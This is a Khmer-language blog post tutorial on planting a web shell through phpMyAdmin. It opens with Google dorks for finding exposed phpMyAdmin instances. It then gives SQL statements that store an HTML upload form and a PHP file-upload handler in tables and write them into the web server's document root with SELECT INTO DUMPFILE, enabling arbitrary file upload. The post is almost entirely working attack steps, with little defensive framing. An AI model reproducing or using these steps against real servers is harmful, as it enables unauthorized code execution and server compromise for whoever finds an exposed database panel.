---
title: "Upload Shell Via phpMyAdmin"
date: 2021-04-01T10:01:06+07:00
description: យល់ដឹងពីវិធីបង្ហោះ Web Shell តាមរយៈ phpMyAdmin
draft: false
hideToc: false
enableToc: false
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- fileupload
- google-dork
- phpmyadmin
categories:
- SQLi
series:
- WebApp
image: images/feature3/sqli.png
---

#### Google Dorks
- allinurl:index.php?db=information_schema
- allinurl:/read_dump.php?

#### SQL Query
ចូលទៅកាន់ផ្ទាំង phpMyAdmin Database ហើយបង្កើត Database ថ្មីមួយ ឧ, "uploader" បន្ទាប់មកចុចត្រង់ផ្ទាំង SQL ហើយចម្លងចូលនូវកូដខាងក្រោមនេះ៖

{{< highlight sql "linenos=table" >}}
CREATE TABLE `uploader`.`userform` (
`track1` VARCHAR( 1000 ) NOT NULL
) ENGINE = MYISAM ;
{{< / highlight >}}

និងកូដខាងក្រោមនេះទៀត៖

{{< highlight sql "lineos=table" >}}
CREATE TABLE `uploader`.`user_upload` (
`track2` VARCHAR( 1000 ) NOT NULL
) ENGINE = MYISAM ;
{{< / highlight >}}

បន្ទាប់មកចូលទៅកាន់ Table ឈ្មោះថា user_upload ហើយចុចត្រង់ផ្ទាំង SQL និងចម្លងចូលនូវកូដខាងក្រោម៖

{{< highlight sql "lineos=table" >}}
insert into userform values ('<!DOCTYPE html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Uploader</title>
</head>
<body bgcolor="black">
<center>
<div style="color:white;margin-top:150px;"><h1>Uploader</h1></div>
<div><br><br>
<form enctype="multipart/form-data" action="uploader.php" method="post">
<input name="userfile" type="file" /><input type="submit" value="Upload" />
</form>
</div>
</center>
</body>
</html>');
{{< / highlight >}}

និងកូដខាងក្រោមផងដែរ

{{< highlight sql "lineos=table" >}}
select * into dumpfile 'C:/xampp/htdocs/wkspace/up.php' from userform
{{< / highlight >}}

ដើម្បីស្វែងរកនូវទីតាំងរបស់ Database Webserver យើងអាចប្រើ Syntax មួយនេះ "SELECT @@datadir" នៅក្នុង SQL Query [SQL Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

ក្រោយមកចម្លងចូលកូដខាងក្រោមនៅក្នុង table user_upload

{{< highlight sql "lineos=table" >}}
INSERT INTO user_upload
VALUES (
"<?php $uploaddir = 'C:/xampp/htdocs/wkspace/'; $uploadfile = $uploaddir . basename($_FILES['userfile']['name']); if
 
(move_uploaded_file($_FILES['userfile']['tmp_name'],$uploadfile)) { print '<body bgcolor=black><center><h2 style=color:white;margin-top:150px;>Uploaded successully.</h2></center></body>'; } else { print '<body bgcolor=black><center><h2 style=color:red;margin-top:150px;>Uploaded Failed.</h2></center></body>'; } ?>"
)
{{< / highlight >}}

ជាចុងក្រោយចម្លងចូលនូវកូដខាងក្រោម៖

{{< highlight sql "lineos=table" >}}
select * into dumpfile 'C:/xampp/htdocs/wkspace/uploader.php' from user_upload
{{< / highlight >}}

ឥឡូវសាកល្បងបើកមើល Web Shell ដែលបានបង្ហោះរួចទៅតាមទីតាំងដែលបានបញ្ចូល ជាការស្រេច។